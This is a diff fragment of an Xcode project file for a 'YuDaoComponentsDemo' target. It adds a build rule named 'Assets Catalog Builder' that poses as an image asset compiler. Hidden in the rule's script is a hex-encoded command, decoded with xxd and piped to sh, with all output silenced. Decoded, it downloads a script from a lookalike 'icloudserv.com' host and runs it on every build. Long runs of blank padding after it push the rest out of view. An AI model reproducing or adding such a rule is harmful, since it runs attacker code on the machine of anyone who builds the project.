+				3B2B04D6210805650067347E /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		3B2B04EA2108070A0067347E /* Build configuration list for PBXNativeTarget "YuDaoComponentsDemo" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				3B2B04EB2108070A0067347E /* Debug */,
+				3B2B04EC2108070A0067347E /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		85E9C9B13A6774820B6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Catalog Builder";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
+	};
+	rootObject = 3B2B04B4210805640067347E /* Project object */;
+}
